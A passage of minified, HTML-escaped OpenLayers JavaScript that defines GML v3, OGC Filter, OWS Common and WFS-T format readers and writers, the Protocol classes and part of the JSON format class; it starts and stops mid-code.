d=c.length;a&lt;d;++a)this.readNode(c[a],{features:b},!0)}else c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMembers"),c.length&amp;&amp;this.readNode(c[0],{features:b},!0)}return b},readNode:function(a,b,c){!0===c&amp;&amp;!0===this.autoConfig&amp;&amp;(this.featureType=null,delete this.namespaceAlias[this.featureNS],delete this.namespaces.feature,this.featureNS=null);this.featureNS||(a.prefix in this.namespaces||a.parentNode.namespaceURI!=this.namespaces.gml||!this.regExes.featureMember.test(a.parentNode.nodeName))|| (this.featureType=a.nodeName.split(":").pop(),this.setNamespace("feature",a.namespaceURI),this.featureNS=a.namespaceURI,this.autoConfig=!0);return OpenLayers.Format.XML.prototype.readNode.apply(this,[a,b])},readers:{gml:{_inherit:function(a,b,c){},featureMember:function(a,b){this.readChildNodes(a,b)},featureMembers:function(a,b){this.readChildNodes(a,b)},name:function(a,b){b.name=this.getChildValue(a)},boundedBy:function(a,b){var c={};this.readChildNodes(a,c);c.components&amp;&amp;0&lt;c.components.length&amp;&amp; (b.bounds=c.components[0])},Point:function(a,b){var c={points:[]};this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(c.points[0])},coordinates:function(a,b){for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace),d,e=c.length,f=Array(e),g=0;g&lt;e;++g)d=c[g].split(","),f[g]=this.xy?new OpenLayers.Geometry.Point(d[0],d[1],d[2]):new OpenLayers.Geometry.Point(d[1],d[0],d[2]);b.points=f},coord:function(a, b){var c={};this.readChildNodes(a,c);b.points||(b.points=[]);b.points.push(new OpenLayers.Geometry.Point(c.x,c.y,c.z))},X:function(a,b){b.x=this.getChildValue(a)},Y:function(a,b){b.y=this.getChildValue(a)},Z:function(a,b){b.z=this.getChildValue(a)},MultiPoint:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPoint(c.components)]},pointMember:function(a,b){this.readChildNodes(a,b)},LineString:function(a, b){var c={};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))},MultiLineString:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiLineString(c.components)]},lineStringMember:function(a,b){this.readChildNodes(a,b)},Polygon:function(a,b){var c={outer:null,inner:[]};this.readers.gml._inherit.apply(this, [a,c,b]);this.readChildNodes(a,c);c.inner.unshift(c.outer);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.Polygon(c.inner))},LinearRing:function(a,b){var c={};this.readers.gml._inherit.apply(this,[a,c]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.LinearRing(c.points)]},MultiPolygon:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)]}, polygonMember:function(a,b){this.readChildNodes(a,b)},GeometryCollection:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.Collection(c.components)]},geometryMember:function(a,b){this.readChildNodes(a,b)}},feature:{"*":function(a,b){var c,d=a.localName||a.nodeName.split(":").pop();b.features?this.singleFeatureType||-1===OpenLayers.Util.indexOf(this.featureType,d)?d===this.featureType&amp;&amp;(c="_typeName"):c= "_typeName":0==a.childNodes.length||1==a.childNodes.length&amp;&amp;3==a.firstChild.nodeType?this.extractAttributes&amp;&amp;(c="_attribute"):c="_geometry";c&amp;&amp;this.readers.feature[c].apply(this,[a,b])},_typeName:function(a,b){var c={components:[],attributes:{}};this.readChildNodes(a,c);c.name&amp;&amp;(c.attributes.name=c.name);var d=new OpenLayers.Feature.Vector(c.components[0],c.attributes);this.singleFeatureType||(d.type=a.nodeName.split(":").pop(),d.namespace=a.namespaceURI);var e=a.getAttribute("fid")||this.getAttributeNS(a, this.namespaces.gml,"id");e&amp;&amp;(d.fid=e);this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;d.geometry)&amp;&amp;d.geometry.transform(this.externalProjection,this.internalProjection);c.bounds&amp;&amp;(d.bounds=c.bounds);b.features.push(d)},_geometry:function(a,b){this.geometryName||(this.geometryName=a.nodeName.split(":").pop());this.readChildNodes(a,b)},_attribute:function(a,b){var c=a.localName||a.nodeName.split(":").pop(),d=this.getChildValue(a);b.attributes[c]=d}},wfs:{FeatureCollection:function(a,b){this.readChildNodes(a, b)}}},write:function(a){var b;b=OpenLayers.Util.isArray(a)?"featureMembers":"featureMember";a=this.writeNode("gml:"+b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:{featureMember:function(a){var b=this.createElementNSPlus("gml:featureMember");this.writeNode("feature:_typeName",a,b);return b},MultiPoint:function(a){var b=this.createElementNSPlus("gml:MultiPoint");a=a.components||[a]; for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("pointMember",a[c],b);return b},pointMember:function(a){var b=this.createElementNSPlus("gml:pointMember");this.writeNode("Point",a,b);return b},MultiLineString:function(a){var b=this.createElementNSPlus("gml:MultiLineString");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("lineStringMember",a[c],b);return b},lineStringMember:function(a){var b=this.createElementNSPlus("gml:lineStringMember");this.writeNode("LineString",a,b);return b}, MultiPolygon:function(a){var b=this.createElementNSPlus("gml:MultiPolygon");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("polygonMember",a[c],b);return b},polygonMember:function(a){var b=this.createElementNSPlus("gml:polygonMember");this.writeNode("Polygon",a,b);return b},GeometryCollection:function(a){for(var b=this.createElementNSPlus("gml:GeometryCollection"),c=0,d=a.components.length;c&lt;d;++c)this.writeNode("geometryMember",a.components[c],b);return b},geometryMember:function(a){var b= this.createElementNSPlus("gml:geometryMember");a=this.writeNode("feature:_geometry",a);b.appendChild(a.firstChild);return b}},feature:{_typeName:function(a){var b=this.createElementNSPlus("feature:"+this.featureType,{attributes:{fid:a.fid}});a.geometry&amp;&amp;this.writeNode("feature:_geometry",a.geometry,b);for(var c in a.attributes){var d=a.attributes[c];null!=d&amp;&amp;this.writeNode("feature:_attribute",{name:c,value:d},b)}return b},_geometry:function(a){this.externalProjection&amp;&amp;this.internalProjection&amp;&amp;(a= a.clone().transform(this.internalProjection,this.externalProjection));var b=this.createElementNSPlus("feature:"+this.geometryName);a=this.writeNode("gml:"+this.geometryTypes[a.CLASS_NAME],a,b);this.srsName&amp;&amp;a.setAttribute("srsName",this.srsName);return b},_attribute:function(a){return this.createElementNSPlus("feature:"+a.name,{value:a.value})}},wfs:{FeatureCollection:function(a){for(var b=this.createElementNSPlus("wfs:FeatureCollection"),c=0,d=a.length;c&lt;d;++c)this.writeNode("gml:featureMember", a[c],b);return b}}},setGeometryTypes:function(){this.geometryTypes={"OpenLayers.Geometry.Point":"Point","OpenLayers.Geometry.MultiPoint":"MultiPoint","OpenLayers.Geometry.LineString":"LineString","OpenLayers.Geometry.MultiLineString":"MultiLineString","OpenLayers.Geometry.Polygon":"Polygon","OpenLayers.Geometry.MultiPolygon":"MultiPolygon","OpenLayers.Geometry.Collection":"GeometryCollection"}},CLASS_NAME:"OpenLayers.Format.GML.Base"});OpenLayers.Format.GML.v3=OpenLayers.Class(OpenLayers.Format.GML.Base,{schemaLocation:"http://www.opengis.net/gml http://schemas.opengis.net/gml/3.1.1/profiles/gmlsfProfile/1.0.0/gmlsf.xsd",curve:!1,multiCurve:!0,surface:!1,multiSurface:!0,initialize:function(a){OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])},readers:{gml:OpenLayers.Util.applyDefaults({_inherit:function(a,b,c){if(a=parseInt(a.getAttribute("srsDimension"),10)||c&amp;&amp;c.srsDimension)b.srsDimension=a},featureMembers:function(a, b){this.readChildNodes(a,b)},Curve:function(a,b){var c={points:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))},segments:function(a,b){this.readChildNodes(a,b)},LineStringSegment:function(a,b){var c={};this.readChildNodes(a,c);c.points&amp;&amp;Array.prototype.push.apply(b.points,c.points)},pos:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(this.regExes.splitSpace), c=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2]);b.points=[c]},posList:function(a,b){for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(this.regExes.splitSpace),d=b.srsDimension||parseInt(a.getAttribute("srsDimension")||a.getAttribute("dimension"),10)||2,e,f,g,h=Array(c.length/d),k=0,l=c.length;k&lt;l;k+=d)e=c[k],f=c[k+1],g=2==d?void 0:c[k+2],h[k/d]=this.xy?new OpenLayers.Geometry.Point(e,f,g):new OpenLayers.Geometry.Point(f, e,g);b.points=h},Surface:function(a,b){this.readChildNodes(a,b)},patches:function(a,b){this.readChildNodes(a,b)},PolygonPatch:function(a,b){this.readers.gml.Polygon.apply(this,[a,b])},exterior:function(a,b){var c={};this.readChildNodes(a,c);b.outer=c.components[0]},interior:function(a,b){var c={};this.readChildNodes(a,c);b.inner.push(c.components[0])},MultiCurve:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0&lt;c.components.length&amp;&amp;(b.components= [new OpenLayers.Geometry.MultiLineString(c.components)])},curveMember:function(a,b){this.readChildNodes(a,b)},MultiSurface:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0&lt;c.components.length&amp;&amp;(b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)])},surfaceMember:function(a,b){this.readChildNodes(a,b)},surfaceMembers:function(a,b){this.readChildNodes(a,b)},pointMembers:function(a,b){this.readChildNodes(a,b)},lineStringMembers:function(a, b){this.readChildNodes(a,b)},polygonMembers:function(a,b){this.readChildNodes(a,b)},geometryMembers:function(a,b){this.readChildNodes(a,b)},Envelope:function(a,b){var c={points:Array(2)};this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))},lowerCorner:function(a,b){var c={};this.readers.gml.pos.apply(this,[a,c]);b.points[0]=c.points[0]},upperCorner:function(a,b){var c={};this.readers.gml.pos.apply(this, [a,c]);b.points[1]=c.points[0]}},OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs},write:function(a){var b;b=OpenLayers.Util.isArray(a)?"featureMembers":"featureMember";a=this.writeNode("gml:"+b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:OpenLayers.Util.applyDefaults({featureMembers:function(a){for(var b= this.createElementNSPlus("gml:featureMembers"),c=0,d=a.length;c&lt;d;++c)this.writeNode("feature:_typeName",a[c],b);return b},Point:function(a){var b=this.createElementNSPlus("gml:Point");this.writeNode("pos",a,b);return b},pos:function(a){return this.createElementNSPlus("gml:pos",{value:this.xy?a.x+" "+a.y:a.y+" "+a.x})},LineString:function(a){var b=this.createElementNSPlus("gml:LineString");this.writeNode("posList",a.components,b);return b},Curve:function(a){var b=this.createElementNSPlus("gml:Curve"); this.writeNode("segments",a,b);return b},segments:function(a){var b=this.createElementNSPlus("gml:segments");this.writeNode("LineStringSegment",a,b);return b},LineStringSegment:function(a){var b=this.createElementNSPlus("gml:LineStringSegment");this.writeNode("posList",a.components,b);return b},posList:function(a){for(var b=a.length,c=Array(b),d,e=0;e&lt;b;++e)d=a[e],c[e]=this.xy?d.x+" "+d.y:d.y+" "+d.x;return this.createElementNSPlus("gml:posList",{value:c.join(" ")})},Surface:function(a){var b=this.createElementNSPlus("gml:Surface"); this.writeNode("patches",a,b);return b},patches:function(a){var b=this.createElementNSPlus("gml:patches");this.writeNode("PolygonPatch",a,b);return b},PolygonPatch:function(a){var b=this.createElementNSPlus("gml:PolygonPatch",{attributes:{interpolation:"planar"}});this.writeNode("exterior",a.components[0],b);for(var c=1,d=a.components.length;c&lt;d;++c)this.writeNode("interior",a.components[c],b);return b},Polygon:function(a){var b=this.createElementNSPlus("gml:Polygon");this.writeNode("exterior",a.components[0], b);for(var c=1,d=a.components.length;c&lt;d;++c)this.writeNode("interior",a.components[c],b);return b},exterior:function(a){var b=this.createElementNSPlus("gml:exterior");this.writeNode("LinearRing",a,b);return b},interior:function(a){var b=this.createElementNSPlus("gml:interior");this.writeNode("LinearRing",a,b);return b},LinearRing:function(a){var b=this.createElementNSPlus("gml:LinearRing");this.writeNode("posList",a.components,b);return b},MultiCurve:function(a){var b=this.createElementNSPlus("gml:MultiCurve"); a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("curveMember",a[c],b);return b},curveMember:function(a){var b=this.createElementNSPlus("gml:curveMember");this.curve?this.writeNode("Curve",a,b):this.writeNode("LineString",a,b);return b},MultiSurface:function(a){var b=this.createElementNSPlus("gml:MultiSurface");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("surfaceMember",a[c],b);return b},surfaceMember:function(a){var b=this.createElementNSPlus("gml:surfaceMember"); this.surface?this.writeNode("Surface",a,b):this.writeNode("Polygon",a,b);return b},Envelope:function(a){var b=this.createElementNSPlus("gml:Envelope");this.writeNode("lowerCorner",a,b);this.writeNode("upperCorner",a,b);this.srsName&amp;&amp;b.setAttribute("srsName",this.srsName);return b},lowerCorner:function(a){return this.createElementNSPlus("gml:lowerCorner",{value:this.xy?a.left+" "+a.bottom:a.bottom+" "+a.left})},upperCorner:function(a){return this.createElementNSPlus("gml:upperCorner",{value:this.xy? a.right+" "+a.top:a.top+" "+a.right})}},OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs},setGeometryTypes:function(){this.geometryTypes={"OpenLayers.Geometry.Point":"Point","OpenLayers.Geometry.MultiPoint":"MultiPoint","OpenLayers.Geometry.LineString":!0===this.curve?"Curve":"LineString","OpenLayers.Geometry.MultiLineString":!1===this.multiCurve?"MultiLineString":"MultiCurve","OpenLayers.Geometry.Polygon":!0=== this.surface?"Surface":"Polygon","OpenLayers.Geometry.MultiPolygon":!1===this.multiSurface?"MultiPolygon":"MultiSurface","OpenLayers.Geometry.Collection":"GeometryCollection"}},CLASS_NAME:"OpenLayers.Format.GML.v3"});OpenLayers.Format.Filter.v1_1_0=OpenLayers.Class(OpenLayers.Format.GML.v3,OpenLayers.Format.Filter.v1,{VERSION:"1.1.0",schemaLocation:"http://www.opengis.net/ogc/filter/1.1.0/filter.xsd",initialize:function(a){OpenLayers.Format.GML.v3.prototype.initialize.apply(this,[a])},readers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a,b){var c=a.getAttribute("matchCase"),c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO,matchCase:!("false"===c||"0"===c)});this.readChildNodes(a, c);b.filters.push(c)},PropertyIsNotEqualTo:function(a,b){var c=a.getAttribute("matchCase"),c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO,matchCase:!("false"===c||"0"===c)});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLike:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LIKE});this.readChildNodes(a,c);var d=a.getAttribute("wildCard"),e=a.getAttribute("singleChar"),f=a.getAttribute("escapeChar");c.value2regex(d,e, f);b.filters.push(c)}},OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v3.prototype.readers.gml,feature:OpenLayers.Format.GML.v3.prototype.readers.feature},writers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsEqualTo",{attributes:{matchCase:a.matchCase}});this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsNotEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsNotEqualTo", {attributes:{matchCase:a.matchCase}});this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLike:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLike",{attributes:{matchCase:a.matchCase,wildCard:"*",singleChar:".",escapeChar:"!"}});this.writeNode("PropertyName",a,b);this.writeNode("Literal",a.regex2value(),b);return b},BBOX:function(a){var b=this.createElementNSPlus("ogc:BBOX");a.property&amp;&amp;this.writeNode("PropertyName",a,b);var c=this.writeNode("gml:Envelope", a.value);a.projection&amp;&amp;c.setAttribute("srsName",a.projection);b.appendChild(c);return b},SortBy:function(a){for(var b=this.createElementNSPlus("ogc:SortBy"),c=0,d=a.length;c&lt;d;c++)this.writeNode("ogc:SortProperty",a[c],b);return b},SortProperty:function(a){var b=this.createElementNSPlus("ogc:SortProperty");this.writeNode("ogc:PropertyName",a,b);this.writeNode("ogc:SortOrder","DESC"==a.order?"DESC":"ASC",b);return b},SortOrder:function(a){return this.createElementNSPlus("ogc:SortOrder",{value:a})}}, OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature},writeSpatial:function(a,b){var c=this.createElementNSPlus("ogc:"+b);this.writeNode("PropertyName",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode("Function",a.value,c);else{var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode("feature:_geometry",a.value).firstChild:this.writeNode("gml:Envelope",a.value);a.projection&amp;&amp; d.setAttribute("srsName",a.projection);c.appendChild(d)}return c},CLASS_NAME:"OpenLayers.Format.Filter.v1_1_0"});OpenLayers.Format.OWSCommon=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",getVersion:function(a,b){var c=this.version;if(!c){var d=a.getAttribute("xmlns:ows");d&amp;&amp;"1.1"===d.substring(d.lastIndexOf("/")+1)&amp;&amp;(c="1.1.0");c||(c=this.defaultVersion)}return c},CLASS_NAME:"OpenLayers.Format.OWSCommon"});OpenLayers.Format.OWSCommon.v1=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},read:function(a,b){OpenLayers.Util.applyDefaults(b,this.options);var c={};this.readChildNodes(a,c);return c},readers:{ows:{Exception:function(a,b){var c={code:a.getAttribute("exceptionCode"),locator:a.getAttribute("locator"),texts:[]};b.exceptions.push(c);this.readChildNodes(a,c)},ExceptionText:function(a,b){var c=this.getChildValue(a);b.texts.push(c)}, ServiceIdentification:function(a,b){b.serviceIdentification={};this.readChildNodes(a,b.serviceIdentification)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b["abstract"]=this.getChildValue(a)},Keywords:function(a,b){b.keywords={};this.readChildNodes(a,b.keywords)},Keyword:function(a,b){b[this.getChildValue(a)]=!0},ServiceType:function(a,b){b.serviceType={codeSpace:a.getAttribute("codeSpace"),value:this.getChildValue(a)}},ServiceTypeVersion:function(a,b){b.serviceTypeVersion= this.getChildValue(a)},Fees:function(a,b){b.fees=this.getChildValue(a)},AccessConstraints:function(a,b){b.accessConstraints=this.getChildValue(a)},ServiceProvider:function(a,b){b.serviceProvider={};this.readChildNodes(a,b.serviceProvider)},ProviderName:function(a,b){b.providerName=this.getChildValue(a)},ProviderSite:function(a,b){b.providerSite=this.getAttributeNS(a,this.namespaces.xlink,"href")},ServiceContact:function(a,b){b.serviceContact={};this.readChildNodes(a,b.serviceContact)},IndividualName:function(a, b){b.individualName=this.getChildValue(a)},PositionName:function(a,b){b.positionName=this.getChildValue(a)},ContactInfo:function(a,b){b.contactInfo={};this.readChildNodes(a,b.contactInfo)},Phone:function(a,b){b.phone={};this.readChildNodes(a,b.phone)},Voice:function(a,b){b.voice=this.getChildValue(a)},Address:function(a,b){b.address={};this.readChildNodes(a,b.address)},DeliveryPoint:function(a,b){b.deliveryPoint=this.getChildValue(a)},City:function(a,b){b.city=this.getChildValue(a)},AdministrativeArea:function(a, b){b.administrativeArea=this.getChildValue(a)},PostalCode:function(a,b){b.postalCode=this.getChildValue(a)},Country:function(a,b){b.country=this.getChildValue(a)},ElectronicMailAddress:function(a,b){b.electronicMailAddress=this.getChildValue(a)},Role:function(a,b){b.role=this.getChildValue(a)},OperationsMetadata:function(a,b){b.operationsMetadata={};this.readChildNodes(a,b.operationsMetadata)},Operation:function(a,b){var c=a.getAttribute("name");b[c]={};this.readChildNodes(a,b[c])},DCP:function(a, b){b.dcp={};this.readChildNodes(a,b.dcp)},HTTP:function(a,b){b.http={};this.readChildNodes(a,b.http)},Get:function(a,b){b.get||(b.get=[]);var c={url:this.getAttributeNS(a,this.namespaces.xlink,"href")};this.readChildNodes(a,c);b.get.push(c)},Post:function(a,b){b.post||(b.post=[]);var c={url:this.getAttributeNS(a,this.namespaces.xlink,"href")};this.readChildNodes(a,c);b.post.push(c)},Parameter:function(a,b){b.parameters||(b.parameters={});var c=a.getAttribute("name");b.parameters[c]={};this.readChildNodes(a, b.parameters[c])},Constraint:function(a,b){b.constraints||(b.constraints={});var c=a.getAttribute("name");b.constraints[c]={};this.readChildNodes(a,b.constraints[c])},Value:function(a,b){b[this.getChildValue(a)]=!0},OutputFormat:function(a,b){b.formats.push({value:this.getChildValue(a)});this.readChildNodes(a,b)},WGS84BoundingBox:function(a,b){var c={};c.crs=a.getAttribute("crs");b.BoundingBox?b.BoundingBox.push(c):(b.projection=c.crs,c=b);this.readChildNodes(a,c)},BoundingBox:function(a,b){this.readers.ows.WGS84BoundingBox.apply(this, [a,b])},LowerCorner:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace);b.left=c[0];b.bottom=c[1]},UpperCorner:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace);b.right=c[0];b.top=c[1];b.bounds=new OpenLayers.Bounds(b.left,b.bottom,b.right,b.top);delete b.left;delete b.bottom;delete b.right;delete b.top}, Language:function(a,b){b.language=this.getChildValue(a)}}},writers:{ows:{BoundingBox:function(a,b){var c=this.createElementNSPlus(b||"ows:BoundingBox",{attributes:{crs:a.projection}});this.writeNode("ows:LowerCorner",a,c);this.writeNode("ows:UpperCorner",a,c);return c},LowerCorner:function(a){return this.createElementNSPlus("ows:LowerCorner",{value:a.bounds.left+" "+a.bounds.bottom})},UpperCorner:function(a){return this.createElementNSPlus("ows:UpperCorner",{value:a.bounds.right+" "+a.bounds.top})}, Identifier:function(a){return this.createElementNSPlus("ows:Identifier",{value:a})},Title:function(a){return this.createElementNSPlus("ows:Title",{value:a})},Abstract:function(a){return this.createElementNSPlus("ows:Abstract",{value:a})},OutputFormat:function(a){return this.createElementNSPlus("ows:OutputFormat",{value:a})}}},CLASS_NAME:"OpenLayers.Format.OWSCommon.v1"});OpenLayers.Format.OWSCommon.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,{namespaces:{ows:"http://www.opengis.net/ows",xlink:"http://www.w3.org/1999/xlink"},readers:{ows:OpenLayers.Util.applyDefaults({ExceptionReport:function(a,b){b.success=!1;b.exceptionReport={version:a.getAttribute("version"),language:a.getAttribute("language"),exceptions:[]};this.readChildNodes(a,b.exceptionReport)}},OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)},writers:{ows:OpenLayers.Format.OWSCommon.v1.prototype.writers.ows}, CLASS_NAME:"OpenLayers.Format.OWSCommon.v1_0_0"});OpenLayers.Format.WFST.v1_1_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_1_0,OpenLayers.Format.WFST.v1,{version:"1.1.0",schemaLocations:{wfs:"http://schemas.opengis.net/wfs/1.1.0/wfs.xsd"},initialize:function(a){OpenLayers.Format.Filter.v1_1_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])},readNode:function(a,b,c){return OpenLayers.Format.GML.v3.prototype.readNode.apply(this,arguments)},readers:{wfs:OpenLayers.Util.applyDefaults({FeatureCollection:function(a, b){b.numberOfFeatures=parseInt(a.getAttribute("numberOfFeatures"));OpenLayers.Format.WFST.v1.prototype.readers.wfs.FeatureCollection.apply(this,arguments)},TransactionResponse:function(a,b){b.insertIds=[];b.success=!1;this.readChildNodes(a,b)},TransactionSummary:function(a,b){b.success=!0},InsertResults:function(a,b){this.readChildNodes(a,b)},Feature:function(a,b){var c={fids:[]};this.readChildNodes(a,c);b.insertIds.push(c.fids[0])}},OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v3.prototype.readers.gml, feature:OpenLayers.Format.GML.v3.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.readers.ogc,ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows},writers:{wfs:OpenLayers.Util.applyDefaults({GetFeature:function(a){var b=OpenLayers.Format.WFST.v1.prototype.writers.wfs.GetFeature.apply(this,arguments);a&amp;&amp;this.setAttributes(b,{resultType:a.resultType,startIndex:a.startIndex,count:a.count});return b},Query:function(a){a=OpenLayers.Util.extend({featureNS:this.featureNS, featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName},a);var b=a.featurePrefix,c=this.createElementNSPlus("wfs:Query",{attributes:{typeName:(b?b+":":"")+a.featureType,srsName:a.srsName}});a.featureNS&amp;&amp;c.setAttribute("xmlns:"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b&lt;d;b++)this.writeNode("wfs:PropertyName",{property:a.propertyNames[b]},c);a.filter&amp;&amp;(OpenLayers.Format.WFST.v1_1_0.prototype.setFilterProperty.call(this,a.filter),this.writeNode("ogc:Filter", a.filter,c));return c},PropertyName:function(a){return this.createElementNSPlus("wfs:PropertyName",{value:a.property})}},OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc},CLASS_NAME:"OpenLayers.Format.WFST.v1_1_0"});OpenLayers.Protocol=OpenLayers.Class({format:null,options:null,autoDestroy:!0,defaultFilter:null,initialize:function(a){a=a||{};OpenLayers.Util.extend(this,a);this.options=a},mergeWithDefaultFilter:function(a){return a&amp;&amp;this.defaultFilter?new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND,filters:[this.defaultFilter,a]}):a||this.defaultFilter||void 0},destroy:function(){this.format=this.options=null},read:function(a){a=a||{};a.filter=this.mergeWithDefaultFilter(a.filter)},create:function(){}, update:function(){},"delete":function(){},commit:function(){},abort:function(a){},createCallback:function(a,b,c){return OpenLayers.Function.bind(function(){a.apply(this,[b,c])},this)},CLASS_NAME:"OpenLayers.Protocol"});OpenLayers.Protocol.Response=OpenLayers.Class({code:null,requestType:null,last:!0,features:null,data:null,reqFeatures:null,priv:null,error:null,initialize:function(a){OpenLayers.Util.extend(this,a)},success:function(){return 0&lt;this.code},CLASS_NAME:"OpenLayers.Protocol.Response"}); OpenLayers.Protocol.Response.SUCCESS=1;OpenLayers.Protocol.Response.FAILURE=0;OpenLayers.Format.JSON=OpenLayers.Class(OpenLayers.Format,{indent:" ",space:" ",newline:"\n",level:0,pretty:!1,nativeJSON:function(){return!(!window.JSON||"function"!=typeof JSON.parse||"function"!=typeof JSON.stringify)}(),read:function(a,b){var c;if(this.nativeJSON)c=JSON.parse(a,b);else try{if(/^[\],:{}\s]*$/.test(a.replace(/\\["\\\/bfnrtu]/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))&amp;&amp;(c=eval("("+a+")"),"function"=== typeof b)){var d=function(a,c){if(c&amp;&amp;"object"===typeof c)for(var e in c)c.hasOwnProperty(e)&amp;&amp;(c[e]=d(e,c[e]));return b(a,c)};c=d("",c)}}catch(e){}this.keepData&amp;&amp;(this.data=c);return c},write:function(a,b){this.pretty=!!b;var c=null,d=typeof a;if(this.serialize[d])try{c=!this.pretty&amp;&amp;this.nativeJSON?JSON.stringify(a):this.serialize[d].apply(this,[a])}catch(e){OpenLayers.Console.error("Trouble serializing: "+e)}return c},writeIndent:function(){var a=[];if(this.pretty)for(var b=0;b&lt;this.level;++b)a.push(this.indent); return a.join("")},writeNewline:function(){return this.pretty?this.newline:""},writeSpace:function(){return this.pretty?this.space:""},serialize:{object:function(a){if(null==a)return"null";if(a.constructor==Date)return this.serialize.date.apply(this,[a]);if(a.constructor==Array)return this.serialize.array.apply(this,[a]);var b=["{"];this.level+=1;var c,d,e,f=!1;for(c in a)a.hasOwnProperty(c)&amp;&amp;(d=OpenLayers.Format.JSON.prototype.write.apply(this,[c,this.pretty]),e=OpenLayers.Format.JSON.prototype.write.apply(this, 